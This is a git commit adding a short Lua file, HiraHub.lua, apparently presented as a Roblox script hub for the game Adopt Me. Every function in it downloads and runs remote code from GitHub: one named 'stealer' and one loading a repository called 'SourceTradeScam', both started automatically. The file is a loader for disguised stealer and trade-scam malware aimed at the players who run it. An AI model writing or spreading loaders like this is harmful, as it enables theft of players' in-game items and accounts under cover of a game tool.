fa95a9a532e84516711c1ca82227fdd91b78f8fa
AdoptMe <sumarmihadi123@gmail.com>
2025-05-01 12:25:35 +0700

    Create HiraHub.lua

---
+++ HiraHub.lua
@@ -0,0 +1,13 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/ByIgniteScript/refs/heads/main/AdoptMeScript.lua'))()
+end
+
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/SourceTradeScam/refs/heads/main/script.lua'))()
+end
+
+task.spawn(stealer)
+
+for i = 1, 1 do
+    task.spawn(farm)
+end
